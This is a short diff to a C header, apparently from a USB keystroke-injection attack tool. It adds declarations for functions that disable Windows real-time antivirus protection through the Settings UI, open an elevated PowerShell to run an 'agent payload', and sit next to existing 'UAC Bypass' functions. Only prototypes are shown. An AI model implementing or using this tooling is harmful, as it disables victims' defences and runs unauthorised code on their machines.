@@ -25,6 +25,18 @@ void hid_payload_send_string(const char *str);
 void hid_payload_send_win_r(void);
 void hid_payload_send_enter(void);
 
+/* Disable Windows real-time protection via Settings UI */
+void hid_payload_disable_realtime_protection(void);
+void hid_payload_send_tab(void);
+void hid_payload_send_space(void);
+void hid_payload_send_left_arrow(void);
+void hid_payload_send_escape(void);
+void hid_payload_send_win_shift_v(void);
+void hid_payload_send_alt_f4(void);
+
+/* Open elevated PowerShell and run the agent payload */
+void hid_payload_run_admin_payload(void);
+
 /* UAC Bypass Functions */
 void hid_payload_send_ctrl_shift_enter(void);
 void hid_payload_send_alt_y(void);
